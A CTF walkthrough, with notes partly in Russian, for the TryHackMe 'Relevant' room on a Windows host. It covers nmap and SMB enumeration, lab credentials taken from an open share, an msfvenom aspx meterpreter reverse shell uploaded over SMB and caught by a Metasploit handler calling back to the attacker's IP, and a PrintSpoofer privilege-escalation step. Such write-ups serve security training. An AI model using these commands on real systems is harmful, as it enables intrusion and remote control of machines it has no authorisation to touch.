https://tryhackme.com/room/relevant
>IP:10.10.118.224

![relevant](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/relevant/screenshots/20250424003100.png)

# Recon
```
sudo nmap -p-  -Pn 10.10.118.224 -O -T4 -sS
```

```
80/tcp    open  http          syn-ack ttl 127
135/tcp   open  msrpc         syn-ack ttl 127
139/tcp   open  netbios-ssn   syn-ack ttl 127
445/tcp   open  microsoft-ds  syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127
49663/tcp open  unknown       syn-ack ttl 127
49666/tcp open  unknown       syn-ack ttl 127
49668/tcp open  unknown       syn-ack ttl 127
Running (JUST GUESSING): Microsoft Windows 2012|2016|2008|7 (91%)
```


```
smbclient -L //10.10.118.224/ -N
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
```

![relevant](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/relevant/screenshots/20250424004454.png)

>SMBv1 - ms17-010 

```
nmap -p139,445 10.10.118.224 --script=smb*
```

![relevant](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/relevant/screenshots/20250424005611.png)

```
smbclient  //10.10.118.224/nt4wrksv -N
get passwords.txt
```

![relevant](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/relevant/screenshots/20250424005825.png)

creds
```
Bob - !P@$$W0rD!123
```

```
Bill - Juw4nnaM4n420696969!$$$
```

```
administasrator:123456
```

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FFUZ -u http://10.10.118.224/FFUZ -ic -c
```

Веб приложении пустое!
![relevant](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/relevant/screenshots/20250424015725.png)
# Exploit's

Исходя из высшее указанной уязвимости я ее раскрутить не смог)
```
https://github.com/3ndG4me/AutoBlue-MS17-010
```

```
searchsploit ms17-010
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                               | windows/remote/42315.py
```

![relevant](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/relevant/screenshots/20250427053702.png)
exec через cme не отработал как и подключение по RPD

```
49663/tcp open     http    Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
```

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.11.134.170 LPORT=1337 -f aspx > shell.aspx
```

```
smbclient  //10.10.108.47/nt4wrksv -N
Try "help" to get a list of possible commands.
smb: \> put shell.aspx 
putting file shell.aspx as \shell.aspx (2.0 kb/s) (average 2.0 kb/s)
```

```
use exploit/multi/handler 
set Lhost tun0
set lport 1337
set payload windows/x64/meterpreter/reverse_tcp
run
```

http://10.10.108.47:49663/nt4wrksv/shell.aspx
![relevant](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/relevant/screenshots/20250427064126.png)
# LPE
![relevant](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/relevant/screenshots/20250427065159.png)
```
c:\>whoami /priv | findstr /i "Impersonate"
whoami /priv | findstr /i "Impersonate"
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```
# printspoofer
https://github.com/dievus/printspoofer
![relevant](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/relevant/screenshots/20250427071722.png)